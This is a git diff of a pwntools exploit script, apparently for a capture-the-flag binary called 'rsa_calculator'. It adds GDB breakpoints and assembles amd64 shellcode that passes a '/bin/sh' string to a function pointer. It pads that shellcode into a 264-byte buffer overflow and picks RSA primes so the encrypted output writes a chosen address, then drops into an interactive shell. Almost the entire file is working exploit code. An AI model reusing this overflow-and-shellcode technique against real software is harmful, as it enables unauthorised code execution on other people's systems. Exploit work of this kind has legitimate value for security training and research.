@@ -1,7 +1,9 @@
 """
 b *0x00400e9c - after copying the input to the global plaintext buffer
 b *0x00400f0d - after stored the encrypted text inside `g_ebuf`
-b *0x00400b04 - after inputting p & q
+b *0x00400ac5 - before inputting p & q
+b *0x00400ad9 - after inputting p
+b *0x00400b04 - after inputting q
 b *0x00400bce - before calculating N 
 b *0x00401408 - calling the handler function in main
 0x6020e0 - g_ebuf
@@ -9,11 +11,12 @@ b *0x00401408 - calling the handler function in main
 0x602560 - g_pbuf 
 """
 
-from functools import reduce
+
+from typing import Tuple
 from pwn import *
 import numpy as np
 
-context.log_level = 'info'
+context.log_level = 'debug'
 
 MODE = 'debug'
 def conn():
@@ -24,6 +27,8 @@ def conn():
     elif MODE == 'debug':
         return gdb.debug('./rsa_calculator', execute='''
                         b *0x00401408
+                        b *0x00400ad9
+                        b *0x00400b04
                         continue
                          ''')
 
@@ -56,64 +61,44 @@ def prime_factors(n):
          factors.append(n)
      return factors
 
+def get_balanced_products(lst, p=1, q=1) -> Tuple[int, int]:
 
+    if not lst:
+        return p, q
+    
+    increased_p = get_balanced_products(lst[1:], p*lst[0], q)
+    increased_q = get_balanced_products(lst[1:], p, q*lst[0])
+    if abs(increased_p[0] - increased_p[1]) < abs(increased_q[0] - increased_q[1]):
+        return increased_p
+    else:
+        return increased_q
+    
+
+FUNC = 0x602500
+G_PBUF = 0x602560
+BIN_SH = b'/bin/sh\x00'
+SHORT_MAX_POSITIVE_NUMBER = 2**16 - 1
 
 if __name__ == "__main__":
     pipe = conn()
-    m = 40
-    payload = 'A'* 264 + chr(m)
+    m = 30
+    
+    sc = f'mov rdi, {G_PBUF};'
+    sc += f'mov rdx, {FUNC + 7*8};'
+    sc += 'call rdx;'
+    machine_code = asm(sc, arch='amd64', os='linux')
+    log.info('shellcode:\n' + disasm(machine_code, arch='amd64', os='linux'))
+    
+    payload = BIN_SH + machine_code + b'A'* (264 - len(machine_code) - len(BIN_SH)) + chr(m).encode()
 
-    target = 0x602500
+    target = G_PBUF + len(BIN_SH)
     e = 5 
     n = m**e - target
+    assert n > target
     
     n_prime_factors = prime_factors(n)
-    n_prime_factors = [2, 2, 2, 3, 5, 13, 797, 797]
-    # p, q = n_prime_factors[-1], n_prime_factors[-2]
-
-    # for prime_number in n_prime_factors[:-2]:
-    #     if p > q:
-    #         q *= prime_number
-    #     else:
-    #         p *= prime_number
-    
-    def f(lst, a=[], b=[], best=(np.inf, [], [])):
-        if not lst:
-            mul = lambda x,y :x*y
-            pa = reduce(mul, a, 1)
-            pb = reduce(mul, b, 1)
-            val = pa-pb if pa>pb else pb-pa
-            return (val, a, b) if val<best[0] else best
-        vala = f(lst[1:], a+[lst[0]], b, best)
-        valb = f(lst[1:], a, b+[lst[0]], best)
-        if vala[0] < best[0]:
-            best = vala
-        if valb[0] < best[0]:
-            best=valb
-        return best
-    a = f(n_prime_factors)
-    def greedy(lst):
-        prod = reduce(lambda x,y: x*y, lst, 1)
-        sq_prod = np.sqrt(prod)
-        a = []
-        pa = 1
-        val = abs(sq_prod - pa)
-        b = []
-        for n in lst[::-1]:
-            if abs(pa*n - sq_prod) < val:
-                val = abs(pa*n-sq_prod)
-                pa*=n
-                a.append(n)
-            else:
-                b.append(n)
-
-        return val, a, b
-    
-    b = greedy(n_prime_factors)
-
-
-
-
+    p, q = get_balanced_products(n_prime_factors)
+    assert p < SHORT_MAX_POSITIVE_NUMBER and q < SHORT_MAX_POSITIVE_NUMBER
     φ_n = (p - 1)*(q - 1) 
     d = mod_inverse(e, φ_n) 
 
@@ -127,6 +112,6 @@ if __name__ == "__main__":
     log.info('sending payload')
     pipe.sendlineafter(b'> ', b'2')
     pipe.sendlineafter(b': ', str(len(payload)).encode())
-    pipe.sendlineafter(b'paste your plain text data\n', payload.encode())
+    pipe.sendlineafter(b'paste your plain text data\n', payload)
 
     pipe.interactive()
